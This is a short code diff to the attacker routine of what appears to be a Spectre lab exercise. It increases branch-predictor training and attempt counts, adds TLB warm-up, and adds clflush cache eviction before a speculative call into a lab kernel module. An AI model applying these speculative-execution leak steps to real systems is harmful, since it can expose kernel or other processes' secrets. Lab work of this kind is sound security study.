@@ -52,10 +52,15 @@ int run_attacker(int kernel_fd, char *shared_memory) {
 
         int scores[256] = {0};
 
-        for (int attempt = 0; attempt < 200; attempt++) {
+        // Touch all pages to warm up TLB
+        for (int i = 0; i < 256; i++) {
+            volatile char tmp = shared_memory[i * SHD_SPECTRE_LAB_PAGE_SIZE];
+        }
+
+        for (int attempt = 0; attempt < 500; attempt++) {
 
             // 1. TRAIN branch predictor
-            for (int i = 0; i < 50; i++) {
+            for (int i = 0; i < 100; i++) {
                 call_kernel_part3(kernel_fd, shared_memory, i % 8);
             }
 
@@ -65,7 +70,12 @@ int run_attacker(int kernel_fd, char *shared_memory) {
             }
 
             mfence();
-            usleep(5);
+            usleep(10);
+
+            //Evict related memory
+            for (int i = 0; i < 1000; i++) {
+                clflush(shared_memory + (i % 256) * SHD_SPECTRE_LAB_PAGE_SIZE);
+            }
 
             // 3. SPECULATIVE call
             call_kernel_part3(kernel_fd, shared_memory, current_offset);
